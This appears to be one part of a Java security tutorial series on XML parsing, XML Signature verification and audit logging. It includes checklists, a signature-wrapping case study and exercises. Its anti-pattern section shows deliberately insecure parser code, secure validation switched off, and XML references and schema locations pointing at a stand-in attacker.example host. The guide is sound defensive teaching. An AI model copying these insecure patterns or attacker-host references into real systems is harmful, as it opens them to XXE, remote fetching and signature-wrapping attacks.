- restrict algorithms;
- validate audience/issuer/recipient/time;
- enforce replay protection;
- pin expected binding/profile.

---

## 28. XML Security Processing Pipeline

Recommended pipeline for signed XML document intake:

```text
1. Receive bytes.
2. Enforce transport/request size limit.
3. Store raw bytes only if needed, with access control.
4. Parse with hardened parser.
5. Reject DTD/external entities/XInclude.
6. Validate root element, namespace, and schema from local trusted schema.
7. Locate Signature element using namespace-aware exact path.
8. Enable XML Signature secure validation.
9. Restrict Reference URI dereferencing.
10. Validate signature cryptographically.
11. Validate certificate/key trust.
12. Validate signer authorization for document type.
13. Bind signed Reference to exact business element.
14. Reject duplicate candidate elements/IDs.
15. Check freshness/replay/idempotency.
16. Process only the signed, validated element.
17. Persist digest/audit metadata.
18. Emit security telemetry.
```

---

## 29. Practical Java Pattern: Signed Business Payload

### 29.1 Domain-specific result type

```java
public record VerifiedXmlPayload(
        String documentId,
        String signerId,
        org.w3c.dom.Element signedElement,
        String canonicalDigest,
        java.time.Instant verifiedAt
) {
}
```

Do not return just `boolean`.

A boolean loses critical binding info.

Bad:

```java
boolean valid = xmlSignatureVerifier.verify(document);
```

Better:

```java
VerifiedXmlPayload verified = xmlSignatureVerifier.verifyAndExtract(document);
process(verified.signedElement());
```

---

### 29.2 Review target

Your verifier should answer:

```text
What was signed?
Who signed it?
Why do we trust that signer?
Which algorithm was used?
Which certificate/key was used?
Was the certificate valid at signing/verification time?
Was the signed element at the expected location?
Was the message fresh?
Was this document ID already processed?
What audit evidence was persisted?
```

---

## 30. Logging and Audit for XML Security

Log metadata, not full XML.

Good:

```text
event=XML_SIGNATURE_VERIFIED
documentType=PaymentInstruction
documentId=PI-2026-00001
signerId=partner-a
certSubjectHash=...
certSerial=...
signatureMethod=rsa-sha256
digestMethod=sha256
referenceUri=#payload-123
verifiedAt=2026-06-16T12:00:00Z
```

Avoid:

```text
fullXml=<Payment>...PII...</Payment>
privateKey=...
sessionToken=...
decryptedPayload=...
```

For failed verification:

```text
event=XML_SIGNATURE_REJECTED
reason=UNTRUSTED_SIGNER
correlationId=...
```

Do not leak detailed crypto oracle information to external caller.

---

## 31. Common Java XML Security Anti-Patterns

### 31.1 Default parser for untrusted XML

```java
DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(input);
```

### 31.2 Ignoring parser feature exception

```java
catch (Exception ignored) {}
```

### 31.3 Trusting embedded `KeyInfo`

```text
"Signature validates using key inside XML, therefore trusted."
```

### 31.4 Processing by tag name after signature validation

```java
document.getElementsByTagName("Assertion").item(0);
```

### 31.5 Not namespace-aware

```java
factory.setNamespaceAware(false);
```

### 31.6 Accepting remote references

```xml
<Reference URI="http://attacker.example/payload"/>
```

### 31.7 Disabling secure validation for compatibility

```java
context.setProperty("org.jcp.xml.dsig.secureValidation", false);
```

### 31.8 Schema from untrusted location

```xml
xsi:schemaLocation="http://attacker.example/schema.xsd"
```

### 31.9 Logging full failed XML

Leaks PII/secrets and may create log injection/DoS risk.

### 31.10 Treating XML Encryption as integrity

Encryption alone does not prove authenticity.

---

## 32. Case Study: Regulatory Agency XML Submission

### 32.1 Scenario

A partner agency submits signed XML case update:

```xml
<CaseUpdateEnvelope xmlns="urn:agency:case-update:v1">
  <Header>
    <MessageId>MSG-123</MessageId>
    <CreatedAt>2026-06-16T10:00:00Z</CreatedAt>
    <SenderAgency>AGENCY-A</SenderAgency>
  </Header>
  <CaseUpdate Id="case-update-123">
    <CaseNo>C-2026-0001</CaseNo>
    <Status>ESCALATED</Status>
  </CaseUpdate>
  <Signature>...</Signature>
</CaseUpdateEnvelope>
```

### 32.2 Desired guarantees

- XML parser does not fetch external resources.
- XML matches expected schema.
- Signature covers `CaseUpdate`.
- Signed element is exactly the one processed.
- Signer certificate belongs to `AGENCY-A`.
- `AGENCY-A` is allowed to submit `CaseUpdate`.
- `MessageId` not replayed.
- `CreatedAt` within allowed skew.
- Audit record stores digest/signature metadata.
- Failed attempts are logged safely.

### 32.3 Attack

Attacker wraps signed old benign `CaseUpdate` into header and injects unsigned malicious one in body.

### 32.4 Defense

- Reference URI must match expected `CaseUpdate/@Id`.
- There must be exactly one `CaseUpdate`.
- Signed element must be child of root at expected position.
- Process only signed element returned by verifier.
- Validate message freshness.
- Enforce idempotency/replay cache.
- Validate signer authorization.

---

## 33. Production Checklist

### 33.1 Parser checklist

- [ ] Reject DTD for untrusted XML.
- [ ] Disable external general entities.
- [ ] Disable external parameter entities.
- [ ] Disable external DTD loading.
- [ ] Disable XInclude.
- [ ] Restrict `ACCESS_EXTERNAL_DTD`.
- [ ] Restrict `ACCESS_EXTERNAL_SCHEMA`.
- [ ] Restrict `ACCESS_EXTERNAL_STYLESHEET`.
- [ ] Use namespace-aware parser.
- [ ] Fail closed if security feature unsupported.
- [ ] Enforce request/body size limit before parse.
- [ ] Enforce parse time/resource limits.
- [ ] Avoid untrusted XSLT.
- [ ] Use local trusted schema only.

### 33.2 Signature checklist

- [ ] Use XML Signature library, not custom signature format.
- [ ] Enable secure validation.
- [ ] Restrict URI dereferencing.
- [ ] Accept only allowed algorithms.
- [ ] Reject weak digest/signature algorithms.
- [ ] Validate certificate chain/trust.
- [ ] Do not trust embedded `KeyInfo` alone.
- [ ] Validate key usage/extended key usage where relevant.
- [ ] Validate signer business authorization.
- [ ] Bind signed reference to processed node.
- [ ] Reject duplicate IDs.
- [ ] Reject unexpected duplicate elements.
- [ ] Validate expected root/namespace/schema.
- [ ] Check timestamp/freshness.
- [ ] Enforce replay cache.

### 33.3 XML Encryption checklist

- [ ] Confirm XML-native encryption is actually required.
- [ ] Use strong algorithms.
- [ ] Protect integrity/authenticity separately.
- [ ] Avoid detailed decryption error leaks.
- [ ] Bind encrypted data to intended recipient.
- [ ] Rotate keys.
- [ ] Audit decrypt operation.
- [ ] Treat decrypted XML as untrusted until parsed/validated safely.

---

## 34. Review Questions

Use these in PR/security review:

1. Is this XML input trusted or untrusted?
2. Which parser API is used?
3. Are DTD/external entities disabled?
4. Are all external resource accesses blocked?
5. Is parser namespace-aware?
6. Is schema loaded from trusted local source only?
7. Is there a request/body size limit before parse?
8. Does code use `getElementsByTagName` for security-critical nodes?
9. Is XPath built from user input?
10. If XML is signed, which exact element/resource is signed?
11. Is the processed business element guaranteed to be the signed element?
12. Are duplicate IDs rejected?
13. Is XML Signature secure validation enabled?
14. Are weak algorithms rejected?
15. Is `KeyInfo` treated only as hint, not trust root?
16. Is certificate chain validated against trusted root/partner registry?
17. Is signer authorized for this document type?
18. Is replay prevented?
19. Are errors returned safely?
20. Is sensitive XML excluded from logs?

---

## 35. Mini Exercise

### Exercise 1

Given this code:

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(inputStream);
String amount = doc.getElementsByTagName("Amount").item(0).getTextContent();
```

Identify at least 10 security weaknesses.

Expected findings:

1. DTD not disabled.
2. External general entities not disabled.
3. External parameter entities not disabled.
4. External DTD loading not disabled.
5. XInclude not disabled.
6. Entity expansion not controlled.
7. Namespace awareness not enabled.
8. No schema validation.
9. No input size limit shown.
10. `getElementsByTagName` ignores namespace and structure.
11. No root element validation.
12. No signature validation.
13. No business invariant validation.
14. No parse error handling strategy.
15. No safe logging strategy.

---

### Exercise 2

Given signed XML, answer:

```text
"Signature validates. Is it safe to process?"
```

Correct answer:

```text
Not necessarily.

A valid signature only proves the referenced canonicalized data was signed
by a key. The application must still verify:
- trusted signer,
- authorized signer,
- allowed algorithms,
- safe reference resolution,
- expected signed node,
- no wrapping,
- freshness,
- replay,
- schema/namespace,
- and business invariants.
```

---

## 36. Part Summary

XML security in Java requires thinking across parser, document semantics, and cryptographic binding.

Key takeaways:

1. XML parser is an active component, not a passive decoder.
2. Untrusted XML must be parsed with hardened configuration.
3. XXE prevention requires disabling DTD/external entities/external resource access and failing closed.
4. DOM/SAX/StAX/Transformer/Schema/XPath each need separate security attention.
5. XML Signature validation is not just `signature.validate(context)`.
6. You must process only the exact signed element.
7. `KeyInfo` is not trust.
8. Signature wrapping is one of the most important XML signature failure modes.
9. XML Encryption gives confidentiality, not automatic authenticity.
10. Signed/encrypted XML processing must produce audit evidence and security telemetry.

---

## 37. What Comes Next

Part berikutnya:

```text
Part 19 — JSON, JWT, JWS, JWE, JOSE, and Token Integrity
```

Kita akan membahas token integrity di dunia JSON/JOSE:

- JWT structure.
- JWS vs JWE.
- `alg=none`.
- algorithm confusion.
- key confusion.
- `kid` injection.
- JWKS cache.
- token claim validation.
- audience/issuer/subject/expiry.
- token revocation.
- replay and binding.
- secure Java token verification pattern.

---

## 38. References

Referensi konseptual dan teknis yang relevan:

1. Oracle Java XML Digital Signature API Overview and Tutorial.
2. Oracle Java XML Digital Signature API documentation and secure validation notes.
3. OWASP XML External Entity Prevention Cheat Sheet.
4. OWASP XML Security Cheat Sheet.
5. OWASP SAML Security Cheat Sheet.
6. W3C XML Signature Syntax and Processing 1.1.
7. W3C XML Signature Best Practices.
8. W3C XML Signature 2.0 / XML Security 2.0 design considerations.
9. Java JAXP APIs: `DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory`, `TransformerFactory`, `SchemaFactory`.
10. Research and industry reports on XML Signature Wrapping attacks in SAML/SOAP systems.

<!-- NAVIGATION_FOOTER -->
---

[⬅️ Sebelumnya: Part 17 — Secure File, Archive, and Data Transfer Integrity](./learn-java-security-cryptography-integrity-part-017.md) | [🏠 Daftar Isi](../../../index.md) | [Selanjutnya ➡️: Part 19 — JSON, JWT, JWS, JWE, JOSE, and Token Integrity](./learn-java-security-cryptography-integrity-part-019.md)
